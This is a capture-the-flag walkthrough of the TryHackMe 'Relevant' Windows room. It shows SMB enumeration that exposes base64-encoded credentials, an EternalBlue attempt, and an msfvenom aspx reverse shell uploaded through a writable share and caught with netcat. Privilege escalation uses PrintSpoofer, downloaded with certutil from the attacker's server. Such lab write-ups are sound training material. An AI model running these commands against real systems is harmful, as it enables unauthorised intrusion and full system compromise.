# Relevant

**Room Link:** [https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant)&#x20;



## Scanning

### Initial Scan

<pre><code><strong>nmap -A 10.10.145.102
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

<pre><code><strong>nmap -p- 10.10.145.102
</strong></code></pre>

### 135/TCP - msrpc

```
nbtscan 10.10.145.102
```

<figure><img src="../../.gitbook/assets/image (9) (4).png" alt=""><figcaption></figcaption></figure>

### TCP/445 - microsoft-ds

There is a share but we couldn't access with smbget but smbclient worked. There was only one file called passwords.txt

<pre><code>smbclient -L http://10.10.179.48
smbget -R smb://10.10.145.102/nt4wrksv
<strong>smbclient  \\\\10.10.145.102\\nt4wrksv 
</strong><strong>smb: \> ls
</strong>smb: \> get passwords.txt 
smb: \> exit

</code></pre>

<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption><p>Can't download files with smbget</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (2) (2).png" alt=""><figcaption><p>Downloaded password file</p></figcaption></figure>

The file contained two bade64 encoded strings which decoded into users and passwords

```
cat passwords.txt 
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

**Credentials Found**

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

### Scanning for vulnerabilities

Decided to scan for vulnerabilities and nmap detected that the host is vulnerable to  m17-010 (EternalBlue)

```
sudo nmap 10.10.145.102 -p80,135,139,445,3389 --script *vuln*
```

<figure><img src="../../.gitbook/assets/image (11) (4).png" alt=""><figcaption></figcaption></figure>

The exploit did not work as expected. It seems the credentials do not work for smb so now we must explore a different route.

```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010/
python zzz_exploit.py -target-ip 10.10.145.102 -port 445 'Bob:!P@$$W0rD!123'
python zzz_exploit.py -target-ip 10.10.145.102 -port 445 'Bill:Juw4nnaM4n420696969!$$$'
```



### TCP/80 - HTTP

```
gobuster dir -u http://10.10.179.48 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 30

```



We can see the passwords.txt file from the browser

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

We can upload files to the nt4wrksv and view the files on webserver on  port 49663 so that means we should be able to add a reverse shell.

**Kali #1**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.179.48  LPORT=1337 — platform windows -a x64 -f aspx -o shell.aspx
smbclient \\\\10.10.231.48\\nt4wrksv
put shell.aspx

```

<figure><img src="../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

**Kali #2**

<pre><code><strong>rlwrap nc -lvnp 1337
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (11) (5) (1).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation

**Exploit:** [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)

As SeImpersonatePrivilege is enabled for the user we can use Printspoofer as it works on Windows 10 and Server 2016/2019.

****

**Victim**

```
systeminfo
whoami /priv
```

<figure><img src="../../.gitbook/assets/image (16) (2) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git clone https://github.com/dievus/printspoofer
cd printspoofer/
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd C:\Windows\Temp
certutil -urlcache -f http://10.10.163.87:81/PrintSpoofer.exe PrintSpoofer.exe
PrintSpoofer.exe -i -c whoami
PrintSpoofer.exe -i -c powershell.exe
```

<figure><img src="../../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (22) (3) (1).png" alt=""><figcaption></figcaption></figure>
